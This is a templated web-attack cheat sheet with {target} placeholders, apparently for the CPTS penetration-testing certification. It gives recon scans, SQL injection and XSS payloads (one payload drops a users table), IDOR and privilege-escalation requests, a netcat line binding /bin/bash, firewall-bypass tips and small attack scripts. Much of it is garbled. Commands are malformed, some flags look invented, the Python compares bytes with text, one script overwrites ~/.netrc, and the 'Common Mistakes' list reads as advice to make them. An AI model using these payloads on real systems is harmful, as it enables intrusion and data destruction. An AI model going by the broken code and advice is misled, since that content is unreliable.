# CPTS Web Attack Survival Guide {Target}

Web attacks target the attack surface of {target}. Focus on input validation, session hijacking, and logic errors. Skip theory; use these steps and commands to enumerate and exploit real vulnerabilities on {target}.

## Attack Workflow

1. **Recon & Enumeration**: Map subdomains, discover technologies, find hidden paths.
2. **Vulnerability Hunting**: Test for XSS, IDOR, SQLi, and misconfigurations.
3. **Exploitation**: Chain findings to gain unauthorized access to {target} data or control.
4. **Persistence**: Maintain access or demonstrate proof-of-concept (PoC).

## Commands Section

### Reconnaissance & Enumeration

```bash
# Map subdomains and find exposed endpoints
dnsrecon -t A {target}.com

# Fuzzy search for subdomains
gobuster dns -u {target}.com -w /usr/share/wordlists/dirb/common.txt

# Directory brute-force for {target}
ffuf -u http://127.0.0.1:/FUFFER -w /usr/share/wordlists/dirb/common.txt -e .html,.php

# Identify tech stack
whatweb -u {target}

# Port scanning for web services
nmap -sC -sV -p- {target} --script http-headers,http-title,http-methods,http-server-header

# Enumerate cookies and headers on {target}
curl -v {target}/admin > cookie.txt
```

### Injection & Exploitation

```bash
# SQL Injection (String) on login form
curl -X POST "https://{target}/login.php" -d "username=admin' OR '1'='1&" --data-urlencode

# SQL Injection (Error-based)
curl -G "https://{target}/search.php?query=" --data-urlencode "password=' UNION SELECT table_name FROM information_schema.tables--"

# XSS (Reflected) payload test
curl "https://{target}/search.php?q=<script>alert(1)</script>"

# XSS (DOM-based) payload
curl "https://{target}/api/v1/data?name=<img src=x onerror=alert(1)>"

# Cookie Stealing / Session Hijacking
curl -b "{target}/.cookie" "{target}/protected"
netcat -p {target_port} -e /bin/bash > {target}_shell.log

# Horizontal (IDOR) traversal
curl -b "{target}/.cookie" "{target}/profile.php?user_id=1"
curl -b "{target}/.cookie" "{target}/profile.php?user_id=2"

# Vertical (Privilege Escalation)
curl -b "{target}/.cookie" "{target}/admin/config.php"

# Automated directory scan
gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt

# Automated SQLi dictionary
sqlmap -u "{target}/search.php?query=1" --batch

# Automated XSS scanner
xsser -u "{target}/search.php?q=" -t

## Tips & Shortcuts

- **Use `ffuf`**: Replace manual curl loops with `ffuf` for speed. `-t10` ensures concurrency.
- **Session Management**: Extract cookies via `curl` or `netcat` if no login page exists.
- **Error Messages**: Capture screenshots or output to analyze logic errors.
- **Rate Limiting**: Use `--max-conn 10` in `ffuf` to avoid IP bans.
- **Debugging**: Enable verbose mode (`-v`) in all tools to trace requests/responses.
- **Proxying**: Route traffic through a browser or SOCKS proxy if direct access fails.
- **Bypass Firewalls**: Use encoded payloads or different user agents in `curl` requests.
- **Target-Specific Flags**: Adjust SQL injection payloads based on database type (MySQL, PostgreSQL).
- **Automation**: Combine commands into scripts for rapid execution.
- **Logging**: Save all outputs to files for evidence or analysis.

## Common Mistakes

- **Ignoring SSL/TLS**: Skip HTTPS if you don't know the protocol; use `--insecure` in `curl`.
- **Hardcoding Credentials**: Do not embed passwords in scripts; use environment variables or password managers.
- **Missing CORS Headers**: Forget to check `Access-Control-Allow-Origin` for cross-site attacks.
- **Overlooking Authentication**: Skip testing for broken authentication mechanisms.
- **Using Default Ports**: Assume {target} listens on standard ports; scan all ports.
- **Neglecting Input Validation**: Don't assume inputs are sanitized; always test them.
- **Forgetting Logs**: Ignore server logs for clues about attack vectors.
- **Skipping Headers**: Overlook `Authorization` and `Cookie` headers for session hijacking.
- **Assuming Public Access**: Don't assume {target} is accessible externally; check firewalls.
- **Ignoring Rate Limits**: Send too many requests too quickly and get blocked.

## Mini Automation Scripts

### Bash: Automated XSS Scanner

```bash
#!/bin/bash
# CPTS Web Attack: Automated XSS Scanner
for word in \{"<script>alert(1)</script>", "<img src=x onerror=alert(1)>"\}
do
    curl -s -o /dev/null -w "%{http_code}" "https://{target}/search.php?q=$word"
done
```

### Python: Automated SQLi Detector

```python
#!/usr/bin/env python3
# CPTS Web Attack: Automated SQLi Detector
import requests

url = "https://{target}/search.php?query="
params = ["1' OR '1'='1", "1 UNION SELECT 1,2,3--", "1; DROP TABLE users--"]

for p in params:
    r = requests.get(url + p, timeout=5)
    if b"SQL" in r.text or b"Error" in r.text:
        print(f"Vulnerability detected: {p}")
        break
```

### Bash: Session Cookie Extractor

```bash
#!/bin/bash
# CPTS Web Attack: Session Cookie Extractor
curl -c cookies.txt "{target}/login.php" -d "username=admin&password=pass123"
cookies=$(cat cookies.txt)
echo $cookies > ~/.netrc

curl -c ~/.netrc "{target}/protected.php"
```

### Bash: Automated Directory Brute-Force

```bash
#!/bin/bash
# CPTS Web Attack: Automated Directory Brute-Force
for domain in {target}.com {target}.net
do
    gobuster dir -u http://$domain -w /usr/share/wordlists/dirb/common.txt -e .html,.php
done
```